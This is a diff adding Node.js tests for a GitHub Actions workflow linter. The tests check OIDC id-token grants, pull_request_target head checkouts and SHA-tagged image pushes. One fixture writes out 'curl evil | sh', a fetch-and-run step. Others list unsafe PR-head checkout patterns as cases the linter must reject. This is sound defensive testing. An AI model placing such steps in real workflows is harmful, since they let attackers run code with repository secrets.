@@ -1,14 +1,18 @@
 import assert from 'node:assert/strict';
-import { readFileSync } from 'node:fs';
+import { readdirSync, readFileSync } from 'node:fs';
 import { test } from 'node:test';
 import {
 	autoMergeProblem,
 	checkWorkflow,
+	grantsIdToken,
 	isProductionGated,
 	jobsOf,
 	needsOf,
+	prTargetHeadCheckouts,
 	pushFullProblem,
-	topLevelPermissions
+	topLevelPermissions,
+	triggersOn,
+	unshaPushSteps
 } from './check_workflows.mjs';
 
 const SHA = 'de0fac2e4500dabe0009e67214ff5f5447ce83dd';
@@ -70,11 +74,73 @@ test('a Lambda log tail may not reach a public Actions log; a comment may name i
 test('top-level permissions are required and may not grant id-token', () => {
 	assert.deepEqual(rules(good.replace('permissions:\n  contents: read\n', '')), ['perms']);
 	assert.deepEqual(rules(good.replace('  contents: read\n', '  contents: read\n  id-token: write\n')), ['perms']);
+	assert.deepEqual(rules(good.replace('permissions:\n  contents: read\n', 'permissions: write-all\n')), ['perms']);
 	assert.equal(topLevelPermissions('permissions: read-all\njobs:\n'), 'permissions: read-all');
 });
 
+test('a job granting id-token: write must be production-gated, whatever it runs', () => {
+	const job = (perms, extra = '') =>
+		`name: x\non: push\npermissions: read-all\njobs:\n  sign:\n    runs-on: ubuntu-latest\n${extra}${perms}    steps:\n      - run: ./mint-a-token.sh\n`;
+	for (const perms of ['    permissions:\n      contents: read\n      id-token: write\n', "    permissions:\n      id-token: 'write'\n", '    permissions: write-all\n', '    permissions: { id-token: write }\n', '    permissions:\n      # OIDC\n      id-token: write # why\n']) {
+		assert.deepEqual(rules(job(perms)), ['oidc-gate'], perms);
+		assert.deepEqual(rules(job(perms, '    environment: production\n')), [], `${perms} (gated)`);
+	}
+	assert.deepEqual(rules(job('    permissions:\n      id-token: read\n')), [], 'read is not a grant');
+	assert.deepEqual(rules(job('    permissions:\n      contents: read\n')), []);
+	assert.ok(!grantsIdToken(['    steps:', '      - run: echo id-token: write']), 'text outside permissions is not a grant');
+	// a reusable-workflow call granting it is held to the same rule
+	assert.deepEqual(rules(`permissions: {}\njobs:\n  call:\n    permissions:\n      id-token: write\n    uses: ./.github/workflows/other.yml\n`), ['oidc-gate']);
+});
+
+test('the OIDC allowlist is one named job, using its action, with no run step', () => {
+	const scorecard = (steps, id = 'analysis') =>
+		`name: s\non: push\npermissions: read-all\njobs:\n  ${id}:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n    steps:\n${steps}`;
+	const action = `      - uses: ossf/scorecard-action@${SHA} # v2.4.4\n`;
+	assert.deepEqual(rules(scorecard(action), '.github/workflows/scorecard.yml'), []);
+	assert.deepEqual(rules(scorecard(action + '      - run: curl evil | sh\n'), '.github/workflows/scorecard.yml'), ['oidc-gate'], 'a run step voids it');
+	assert.deepEqual(rules(scorecard(action), '.github/workflows/other.yml'), ['oidc-gate'], 'another workflow');
+	assert.deepEqual(rules(scorecard(action, 'other'), '.github/workflows/scorecard.yml'), ['oidc-gate'], 'another job');
+	assert.deepEqual(rules(scorecard(`      - uses: actions/checkout@${SHA} # v6.0.2\n`), '.github/workflows/scorecard.yml'), ['oidc-gate'], 'without the action');
+	assert.deepEqual(rules(scorecard(action + `      - uses: aws-actions/configure-aws-credentials@${SHA} # v6.1.1\n`), '.github/workflows/scorecard.yml'), ['oidc-env'], 'AWS is never allowlisted');
+});
+
+test('pull_request_target may never check out or fetch the PR head', () => {
+	const prt = (trigger, steps) => `name: x\non:${trigger}\npermissions: read-all\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n${steps}`;
+	const block = '\n  pull_request_target:\n    types: [opened]';
+	const checkout = (ref) => `      - uses: actions/checkout@${SHA} # v6.0.2\n        with:\n          ${ref}\n`;
+	for (const bad of [
+		checkout('ref: ${{ github.event.pull_request.head.sha }}'),
+		checkout('ref: ${{ github.event.pull_request.head.ref }}'),
+		checkout('repository: ${{ github.event.pull_request.head.repo.full_name }}'),
+		checkout('ref: ${{ github.head_ref }}'),
+		checkout('ref: refs/pull/${{ github.event.number }}/merge'),
+		'      - run: gh pr checkout ${{ github.event.number }}\n',
+		'      - run: git fetch origin refs/pull/1/head\n',
+		'      - env:\n          HEAD: ${{ github.event.pull_request.head.sha }}\n        run: git checkout "$HEAD"\n',
+	]) {
+		assert.deepEqual(rules(prt(block, bad)), ['prt-head'], bad);
+		assert.deepEqual(rules(prt(' [pull_request_target]', bad)), ['prt-head'], `inline list: ${bad}`);
+		assert.deepEqual(rules(prt(' pull_request_target', bad)), ['prt-head'], `scalar: ${bad}`);
+		assert.deepEqual(rules(prt('\n  - pull_request_target', bad)), ['prt-head'], `block list: ${bad}`);
+		assert.deepEqual(rules(prt('\n  pull_request:', bad)), [], `plain pull_request is fine: ${bad}`);
+	}
+	// reading head metadata in an expression, a comment, or the base checkout is fine
+	assert.deepEqual(rules(prt(block, `      - if: \${{ !contains(github.event.pull_request.head.ref, 'x/') }}\n        run: echo ok\n`)), []);
+	assert.deepEqual(rules(prt(block, `      # never: ref: \${{ github.event.pull_request.head.sha }}\n` + checkout('persist-credentials: false'))), []);
+	assert.ok(!triggersOn('on:\n  pull_request_target_x:\n', 'pull_request_target'));
+	assert.ok(!triggersOn('on: push\njobs:\n  pull_request_target:\n', 'pull_request_target'), 'a job id is not a trigger');
+	assert.deepEqual(prTargetHeadCheckouts(prt('\n  push:', checkout('ref: ${{ github.head_ref }}'))), []);
+});
+
+test('the repo workflows pass the guard (real positive control)', () => {
+	const dir = new URL('../../.github/workflows/', import.meta.url);
+	for (const f of readdirSync(dir).filter((n) => /\.ya?ml$/.test(n))) {
+		assert.deepEqual(checkWorkflow(`.github/workflows/${f}`, readFileSync(new URL(f, dir), 'utf8')), [], f);
+	}
+});
+
 test('assuming an AWS role outside environment: production fails', () => {
-	assert.deepEqual(rules(good.replace('    environment: production\n', '')), ['oidc-env']);
+	assert.deepEqual(rules(good.replace('    environment: production\n', '')), ['oidc-env', 'oidc-gate']);
 	assert.ok(isProductionGated(['    environment:', '      name: production', '      url: https://x']));
 	assert.ok(!isProductionGated(['    environment: preview']));
 });
@@ -143,6 +209,31 @@ test('a docker build must produce one linux/amd64 manifest without attestations'
 	assert.deepEqual(rules(good + '      - run: docker build -t x .\n'), ['image']);
 	assert.deepEqual(rules(good + ok.replace(' --sbom=false', '')), ['image']);
 	assert.deepEqual(rules(good + '      # docker build -t x .\n'), []);
+});
+
+test('an image push must name the commit it was built from', () => {
+	const push = (env) =>
+		'      - name: Push\n        env:\n          VERSION: ${{ needs.preflight.outputs.version }}\n' +
+		env +
+		'        run: |\n          docker tag a "b:$TAG"\n          docker push "b:$TAG"\n      - name: Next\n        run: echo "${{ github.sha }}"\n';
+	// Positive controls: the preflight's SHA, or github.sha, in the step.
+	assert.deepEqual(rules(good + push('          COMMIT_SHA: ${{ needs.preflight.outputs.sha }}\n')), []);
+	assert.deepEqual(rules(good + push('          COMMIT_SHA: ${{ github.sha }}\n')), []);
+	// The version alone: a recut release would keep the old image.
+	assert.deepEqual(rules(good + push('')), ['image-sha']);
+	// A SHA in the NEXT step doesn't count, nor does a commented-out one.
+	assert.deepEqual(unshaPushSteps((good + push('          # COMMIT_SHA: ${{ github.sha }}\n')).split('\n')).length, 1);
+	// A commented push is not a push.
+	assert.deepEqual(rules(good + '      # - run: docker push x\n'), []);
+});
+
+test('image-sha: the repo deploy workflows pass', () => {
+	for (const f of ['deploy-backend.yml', 'deploy-frontend.yml']) {
+		const file = new URL(`../../.github/workflows/${f}`, import.meta.url);
+		assert.deepEqual(unshaPushSteps(readFileSync(file, 'utf8').split('\n')), [], f);
+	}
+	// And the backend deploy really pushes (so the check above checked something).
+	assert.match(readFileSync(new URL('../../.github/workflows/deploy-backend.yml', import.meta.url), 'utf8'), /docker push "\$image"/);
 });
 
 const EXCLUDE_RENDERER_DEPS =
